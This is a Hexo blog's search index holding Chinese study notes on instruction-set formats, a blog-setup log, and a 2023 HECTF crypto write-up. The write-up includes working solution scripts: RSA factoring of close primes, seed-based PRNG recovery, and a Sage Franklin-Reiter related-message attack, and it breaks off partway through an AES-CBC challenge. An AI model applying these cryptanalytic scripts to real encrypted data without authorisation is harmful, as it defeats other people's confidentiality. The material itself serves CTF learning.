<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【计组学习笔记】第四章——指令系统</title>
      <link href="/2023/11/23/2023-11-22-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/11/23/2023-11-22-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="4-1-指令系统："><a href="#4-1-指令系统：" class="headerlink" title="4.1 指令系统："></a>4.1 指令系统：</h1><p>​       指令：又称<strong>机器指令</strong>，是指示计算机执行某种操作的命令，是计算机运行的最小功能单位。</p><p>指令集：一台计算机的所有指令的集合构成该机的<strong>指令系统</strong></p><p>指令系统（指令集）是指令集体系结构（ISA）中最核心的部分</p><h2 id="4-1-1-指令的基本格式"><a href="#4-1-1-指令的基本格式" class="headerlink" title="4.1.1 指令的基本格式"></a>4.1.1 指令的基本格式</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700735562097-07f8460f-776a-48bc-8ce5-f9c50a5d51c0.png" alt="img"></p><ul><li><p>操作码：指明做了什么动作</p></li><li><ul><li>作用1：执行什么性质的操作，具有何种功能</li><li>作用2：识别指令、了解指令功能、区分操作数地址内容的组成和使用方法</li><li>举例：停机中断、求反求补、加减乘除</li></ul></li><li><p>地址码：指明对谁动手脚</p></li><li><ul><li>不需要操作对象</li><li>需要一个操作对象</li><li>需要两个操作对象</li><li>特性：</li></ul></li><li><ul><li><ul><li>n位地址码的直接寻址范围&#x3D;<img src="https://cdn.nlark.com/yuque/__latex/055ce37910d06a8239ef5a1ee87765f5.svg" alt="img"></li><li>若指令总长度固定不变，则地址码数量越多，寻址能力越差</li></ul></li></ul></li><li><p>指令的长度：一条指令中所包含的二进制代码的位数</p></li><li><ul><li>指令字长取决于：</li></ul></li><li><ul><li><ul><li>操作码的长度</li><li>操作数<strong>地址码</strong>的长度</li><li>操作数<strong>地址</strong>的个数</li></ul></li></ul></li><li><ul><li>指令长度和机器字长无固定关系，但是可以进行分类：</li></ul></li><li><ul><li><ul><li>单字长指令：指令长度等于机器字长的指令</li><li>半字长指令：指令长度等于半个机器字长的指令</li><li>双字长指令：指令长度等于两个机器字长的指令</li></ul></li></ul></li><li><p>指令字长</p></li></ul><p>一条指令的总长度（可能会变）</p><ul><li>机器字长</li></ul><p>CPU进行一次整数运算所能处理的二进制数据的位数（通常和ALU相关）</p><ul><li>存储字长</li></ul><p>一个存储单元中的二进制代码位数（通常和MDR位数相同）</p><h3 id="整体框架"><a href="#整体框架" class="headerlink" title="整体框架"></a>整体框架</h3><p> <img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529939609-9f254304-23dc-4a9a-9d61-80949cf2c2cf.png" alt="img"></p><p> <img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700530803938-6d4044e8-5482-4e7e-b826-8bb40a6b0cf7.png" alt="img"></p><p><strong>解释一下：</strong></p><p><strong>MAR</strong>：地址寄存器 存放预访问的存储单元的地址，其位数对应存储单元的个数</p><p><strong>MDR</strong>：数据寄存器 存放从存储体某单元取出的代码</p><h3 id="1-零地址指令"><a href="#1-零地址指令" class="headerlink" title="1. 零地址指令"></a>1. 零地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700737333811-b69655d1-5b3c-492d-9f21-8f7924ec2c13.png" alt="img"></p><p>只给出操作码OP，没有显式地址。有两种可能：</p><p>  (1) 不需要操作数的指令，如空操作，停机，关中断等指令</p><p>  (2) 零地址的运算类指令仅用在堆栈计算机中，两个操作数隐含存放在栈顶和次栈顶弹出，送到运算器进行运算，计算结果隐含的压回栈顶 类似“后缀表达式”</p><h3 id="2-一地址指令"><a href="#2-一地址指令" class="headerlink" title="2. 一地址指令"></a>2. 一地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700528843600-4834a977-6e70-4c86-93b5-cec8be702aaa.png" alt="img"></p><p>其中</p><p><strong>ACC</strong>：Accumulator累加器，是运算器中既能存放运算前的操作数，又能存放运算结果的寄存器</p><p><strong>ALU</strong>：算数逻辑单元，可以进行算术运算（加减乘除）逻辑运算（与或非异或）辅助功能（移位求补）</p><p>对于寻址范围做出解释：</p><p>指令字长为32为，操作码占8位，1个地址码字段占24位，则指令操作数的直接寻址范围为<img src="https://cdn.nlark.com/yuque/__latex/15d04819c5dddc99711267e7e27f0f98.svg" alt="img">bit</p><p>进行单位换算为<img src="https://cdn.nlark.com/yuque/__latex/872f8e29a949503f528e4a65325b996e.svg" alt="img">* <img src="https://cdn.nlark.com/yuque/__latex/64636e8771ef215128139253c19e840a.svg" alt="img">位 &#x3D; 16 M</p><h3 id="3-二地址指令"><a href="#3-二地址指令" class="headerlink" title="3. 二地址指令"></a>3. 二地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700527387652-2cf386f0-ff1e-4f7f-ac75-92bf857bee0f.png" alt="img"></p><p>其中目的操作数保存本次的运算结果</p><p>对于寻址范围做出解释：</p><p>指令字长为32为，操作码占8位，两个地址码字段各占12位，则指令操作数的直接寻址范围为<img src="https://cdn.nlark.com/yuque/__latex/15cd115f2a18cc8842ed3d8dc9d5372e.svg" alt="img">bit</p><p>进行单位换算为<img src="https://cdn.nlark.com/yuque/__latex/47a0f3528006ad0757aa3a00b3fd6f5e.svg" alt="img">* <img src="https://cdn.nlark.com/yuque/__latex/f21b0a508bad7e226d4eebcb732edd1a.svg" alt="img">位 &#x3D; 4 K</p><h3 id="4-三地址指令"><a href="#4-三地址指令" class="headerlink" title="4. 三地址指令"></a>4. 三地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529808503-fc9a6875-4ce1-427e-97cd-0ca5f0c1b972.png" alt="img"></p><h3 id="5-四地址指令"><a href="#5-四地址指令" class="headerlink" title="5. 四地址指令"></a>5. 四地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529860336-14105e7b-4bb1-4e34-92b0-0551537b255b.png" alt="img"></p><p>特殊点：</p><p>正常情况下取指令之后PC+1，指向下一条指令</p><p>四指令地址：取执行指令后，将PC的值修改为<img src="https://cdn.nlark.com/yuque/__latex/e639cfa67e1a86f2b6223153524439bc.svg" alt="img">（下址）所指地址</p><h2 id="4-1-2-定长操作码指令格式"><a href="#4-1-2-定长操作码指令格式" class="headerlink" title="4.1.2 定长操作码指令格式"></a>4.1.2 定长操作码指令格式</h2><p><strong>定长操作码</strong>指令在指令的最高部分分配若干位（定长）表示操作码。</p><p>一般n位操作码字段的指令系统最大能表示<img src="https://cdn.nlark.com/yuque/__latex/055ce37910d06a8239ef5a1ee87765f5.svg" alt="img">条指令</p><h2 id="4-1-3-扩展操作码指令格式"><a href="#4-1-3-扩展操作码指令格式" class="headerlink" title="4.1.3 扩展操作码指令格式"></a>4.1.3 扩展操作码指令格式</h2><h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>在指令字长有限的前提下保持比较丰富的指令种类，可采用<strong>可变长度操作码</strong>，即全部指令的操作码字段的位数不固定，且分散地放在指令字的不同位置上。</p><h3 id="实现方式："><a href="#实现方式：" class="headerlink" title="实现方式："></a>实现方式：</h3><p>定长指令字结构+可变长操作码 -&gt; 扩展操作码指令格式</p><p><strong>扩展操作码</strong> 使操作码的长度随地址码的减少而增加，不同地址数的指令可具有不同长度的操作码，从而在满足需要的前提下有效缩短指令字长</p><h2 id="4-1-4-指令分类（按操作类型分类）"><a href="#4-1-4-指令分类（按操作类型分类）" class="headerlink" title="4.1.4 指令分类（按操作类型分类）"></a>4.1.4 指令分类（按操作类型分类）</h2><h3 id="1-数据传送（数据传送类：进行主存和CPU之间的数据传送）"><a href="#1-数据传送（数据传送类：进行主存和CPU之间的数据传送）" class="headerlink" title="1. 数据传送（数据传送类：进行主存和CPU之间的数据传送）"></a>1. 数据传送（数据传送类：进行主存和CPU之间的数据传送）</h3><ol><li><ol><li>LOAD：从内存单元读取数据到CPU寄存器（LOAD）</li><li>STORE：把CPU寄存器写数据到内存单元（STORE）</li><li>MOV：传输指令通常由寄存器之间的传送（MOV）</li></ol></li></ol><h3 id="2-运算类"><a href="#2-运算类" class="headerlink" title="2. 运算类"></a>2. 运算类</h3><p>算数与逻辑运算：</p><blockquote><p>ADD：加</p><p>SUB：减</p><p>CMP：比较</p><p>MUL：乘</p><p>DIV：除</p><p>INC：加1</p><p>DEC：减1</p><p>AND：与</p><p>OR：或</p><p>NOT：取反</p><p>XOR：异或</p></blockquote><h3 id="3-移位操作"><a href="#3-移位操作" class="headerlink" title="3. 移位操作"></a>3. 移位操作</h3><ol><li>算数移位</li><li>逻辑移位</li><li>循环移位</li></ol><h3 id="4-转移操作"><a href="#4-转移操作" class="headerlink" title="4. 转移操作"></a>4. 转移操作</h3><blockquote><p>JMP：无条件转移</p><p>BRANCH：条件转移</p><p>CALL：调用</p><p>RET：返回</p><p>TRAP：陷阱</p></blockquote><p>区分：</p><ul><li><p><strong>无条件转移指令</strong>在任何情况下都执行转移操作</p></li><li><p><strong>条件转移指令</strong>仅在特定条件满足时才执行转移操作，其中转移条件一般是某个标志位的值，或几个标志位的组合</p></li><li><p>执行<strong>调用指令</strong>是必须保存下一条指令的地址（返回地址），当子程序执行结束时，根据返回地址返回到主程序继续执行</p></li><li><p><strong>转移指令</strong>则不返回执行</p></li></ul><h3 id="5-输入输出类"><a href="#5-输入输出类" class="headerlink" title="5. 输入输出类"></a>5. 输入输出类</h3><p>CPU与外部设备</p>]]></content>
      
      
      <categories>
          
          <category> computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建记录</title>
      <link href="/2023/11/22/2023-11-22-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/11/22/2023-11-22-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建记录"><a href="#博客搭建记录" class="headerlink" title="博客搭建记录"></a>博客搭建记录</h1><p>今天终于也算是完成了基于hexo框架 butterfly主题的博客搭建<br>在这过程中收获很多<br>对于git、npm的使用和理解也更多了</p><hr><p>目前整体的使用流程就是在本地写好md文件放到post中<br>然后在本地blog文件夹中打开<code>git bash</code><br>常用的只有三种命令</p><ul><li><code>hexo g</code></li><li><code>hexo d</code> 远程推送</li><li><code>hexo s</code> 本地查看</li></ul><hr><p>在搭建过程中也遇到很多问题，将看到的博客记录下：</p><ul><li><a href="https://www.wzhecnu.cn/2021/07/22/blog/hexo-02-zhu-ti-mei-hua/">设置分类和标签</a></li><li><a href="https://hj24.life/posts/%E8%A7%A3%E5%86%B3hexo%E5%8D%9A%E5%AE%A2%E4%B8%8D%E8%83%BD%E6%98%BE%E7%A4%BA%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98/">外部图床无法引用问题</a></li><li><a href="https://blog.csdn.net/cj461733387/article/details/124548828">法二</a></li></ul><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231122015855865.png" alt="image-20231122015855865"></p><ul><li><p><a href="https://zhuanlan.zhihu.com/p/655349835">上传过慢，配置ssh</a></p></li><li><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">效果美化</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023HECTF</title>
      <link href="/2023/11/21/2023-11-18-HECTF/"/>
      <url>/2023/11/21/2023-11-18-HECTF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="2023HECTF"><a href="#2023HECTF" class="headerlink" title="2023HECTF"></a>2023HECTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rsarsa-solved）"><a href="#rsarsa-solved）" class="headerlink" title="rsarsa|(solved）"></a>rsarsa|(solved）</h3><h4 id="考点：rsa-公式分解"><a href="#考点：rsa-公式分解" class="headerlink" title="考点：rsa 公式分解"></a>考点：rsa 公式分解</h4><h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h4><p>原题:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from functools import reduce</span></span><br><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># from secret import flag,hint</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generate_PQ(bits):</span></span><br><span class="line"><span class="comment">#     x = getPrime(bits) &gt;&gt; bits//2 &lt;&lt; bits//2</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         p = x + random.getrandbits(bits//2)</span></span><br><span class="line"><span class="comment">#         if isPrime(p):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         q = x + random.getrandbits(bits//2)</span></span><br><span class="line"><span class="comment">#         if isPrime(q):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     return p,q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># hint = bytes_to_long(hint)</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># p,q = generate_PQ(1024)</span></span><br><span class="line"><span class="comment"># n = p*q</span></span><br><span class="line">seed = <span class="number">256087</span>+<span class="number">396445</span>-<span class="number">538018</span></span><br><span class="line">random.seed(seed)    <span class="comment">#只要seed确定 后面生成的数就相同</span></span><br><span class="line">x = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]  <span class="comment">#只生成两个数</span></span><br><span class="line">y = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="comment"># print(&quot;c =&quot;,pow(hint,e,n))</span></span><br><span class="line"><span class="comment"># print(&quot;n =&quot;,n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[30509, 13601]</span></span><br><span class="line"><span class="comment">#[92095, 27065]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = (30509*m + 13601)^17 % n </span></span><br><span class="line"><span class="comment"># c2 = (92095*m + 27065)^17 % n</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;c1 =&quot;,pow(reduce(lambda x, y: x * m + y, x), 17, n))</span></span><br><span class="line"><span class="comment"># #解释一下这段公式</span></span><br><span class="line"><span class="comment"># #reduce函数存在两个参数 第一个是式子 第二个是对应的操作值</span></span><br><span class="line"><span class="comment"># #比如一个x=[2,3,4] 那么lambda表达式会每次在x中取两个值 并且将运算的结果累计到下一个x 然后y向后取一个数                                      </span></span><br><span class="line"><span class="comment"># print(&quot;c2 =&quot;,pow(reduce(lambda x, y: x * m + y, y), 17, n))</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259</span></span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(c1,c2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = pow(x,17,n)</span></span><br><span class="line">p = <span class="number">160616239660727858899273379103592231155409056274229284184975467127574269595624091311175627078626817259122507024363284463167205592226280887239280008933792076628602313168161987456794466948371108388445589568660803435612911564349113520700334500717237521981464112146232603304167030094761289132103178741978484324163</span></span><br><span class="line">q = <span class="number">160616239660727858899273379103592231155409056274229284184975467127574269595624091311175627078626817259122507024363284463167205592226280887239280008933792069345408116962980054711105579607903079344180647686753187313507576711078157922258567830351506693970326314484271008164343339287427523462030830749467794546707</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment">#b&#x27;Hint&#123;Seed_is_256087_+_396445_-_538018&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p> 其中一些解题的经过也放在里面了</p><p>该题主要是两部分组成</p><p>首先是根据p和q的生成方式 两数非常接近</p><p>所以通过yafu本地即可以分解n</p><p>然后利用n分解的p和q 成功获得hint提示</p><p>提示告诉了我们种子是什么</p><p>在生成随机数的时候：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(seed)    <span class="comment">#只要seed确定 后面生成的数就相同</span></span><br><span class="line">x = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]  <span class="comment">#只生成两个数</span></span><br><span class="line">y = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br></pre></td></tr></table></figure><p>随机数生成器由种子决定 所以是伪随机</p><p>当种子seed确定之后 后面两个值的生成是完全固定的</p><p>所以算出种子 本地跑一下就可以获得x和y的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[30509, 13601]</span></span><br><span class="line"><span class="comment">#[92095, 27065]</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = (30509*m + 13601)^17 % n </span></span><br><span class="line"><span class="comment"># c2 = (92095*m + 27065)^17 % n</span></span><br></pre></td></tr></table></figure><p>目前卡在最后一步</p><p>已知c1和c2 和n 如何求出m</p><p>&#x3D;&gt; 相关明文攻击</p><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">脚本来源</a></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119230808324.png" alt="image-20231119230808324"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, n, e</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="comment"># replace a,b,c,d</span></span><br><span class="line">    a = <span class="number">30509</span> </span><br><span class="line">    b = <span class="number">13601</span></span><br><span class="line">    c = <span class="number">92095</span></span><br><span class="line">    d = <span class="number">27065</span></span><br><span class="line">    g1 = (a*x+b)^e - c1</span><br><span class="line">    g2 = (c*x+d)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">m1 = attack(c1, c2, n, e)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m1)))</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;HECTF&#123;r3411y_easy_R4nd0m_And_r3l4ted_m3554ge_att4ck&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="我们仨-solved"><a href="#我们仨-solved" class="headerlink" title="我们仨|(solved)"></a>我们仨|(solved)</h3><h4 id="考点：AES-异或-多素数rsa解密-DES"><a href="#考点：AES-异或-多素数rsa解密-DES" class="headerlink" title="考点：AES 异或 多素数rsa解密 DES"></a>考点：AES 异或 多素数rsa解密 DES</h4><h4 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h4><p>三层套娃：</p><p>第一关：</p><p>与NewStarWeek1非常一模一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_program</span>():</span><br><span class="line">    secret_data = padding(flag)</span><br><span class="line">    secret_key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    init_vector = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(secret_key) ^ bytes_to_long(init_vector) ^ <span class="number">1</span>)</span><br><span class="line">    cipher = AES.new(secret_key, AES.MODE_CBC, init_vector)</span><br><span class="line">    encrypted_flag = cipher.encrypt(secret_data)</span><br><span class="line">    <span class="built_in">print</span>(encrypted_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &quot;__main__&quot;:</span></span><br><span 